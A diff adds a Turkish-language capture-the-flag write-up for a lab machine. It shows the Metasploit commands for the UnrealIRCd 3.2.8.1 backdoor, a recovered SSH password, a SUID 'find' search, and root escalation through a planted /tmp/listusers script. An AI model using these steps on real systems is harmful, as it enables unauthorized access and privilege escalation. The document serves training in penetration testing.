@@ -1,0 +1,46 @@
+-----------------------------------------------------------------USER----------------------------------------------------------------
+nmap taramasında ssh, rpcbind ve irc portlarının açık olduğunu gördüm
+
+22 --> ssh
+111 --> rpcbind
+8067 --> unreal ircd
+
+sonrasında araştırma ile UnrealIRCd 3.2.8.1 exploit buldum (searchsploit araması : UnrealIRCd 3.2.8.1 - Backdoor Command Exe | exploits/linux/remote/16922.rb)
+
+ve metasploit ile exploit'i kullandım : 
+
+use exploit/linux/remote/16922
+set rhost 10.10.10.117
+set rport 8067
+exploit -j
+
+ve burdan sonra dizinlerde gezinmeye başladım. /home/djmardov/Documents/.backup (UPupDOWNdownLRlrBAbaSSss)  da şifre gibi bir karma buldum
+ve ne olduğuna dair düşünmeye başladım sonrasında aklıma 80 portta bulduğum resim geldi, acaba resimin içinde veri olabilirmi
+diye düşündüm ve (https://futureboy.us/stegano/decinput.html) sitesinden denemeye karar verdim ve başarılı oldum bulduğum şeyi direk
+ssh bağlantısı ile djmardov üzerinde denedim ve login oldum.(parola : Kab6h+m+bbp2J:HG  )
+
+------------------------------------------------------------------ROOT----------------------------------------------------------
+root.txt için dosyalara bakmaya başladım ve dikkatimi bazı dosyalarda setuid olduğunu öğrendim ve hemen araştırma yapmaya başladım.
+
+https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html --> ve bu siteden yardım alarak bilgiler edindim ve şu aşamaları gerçekleştirdim
+
+# find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/deneme
+
+/ : root dizininden itibaren tüm dosyaları kontrol eder , mesela /etc de olabilirdi.
+user : hangi kullanıcı yetkilerine sahip
+exec : yazdığımız komutu çalıştırır
+> : dosyanın çıktılarını yazması için yönlendireceğimiz yer
+
+-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
+
+/usr/bin/viewuser çalıştırdığımda " sh: 1: /tmp/listusers: not found " hatası veriyordu
+bu scriptin çalışması için /tmp dizininde listusers betiği olması gerekiyordu bende oluşturup denemeye başladım ve en son şu adımları uyguladım
+
+-touch listusers
+-nano listusers
+"""
+cat /root/root.txt
+"""
+-chmod 700 listusers
+-/usr/bin/viewuser --> yaptık ve root.txt 
+
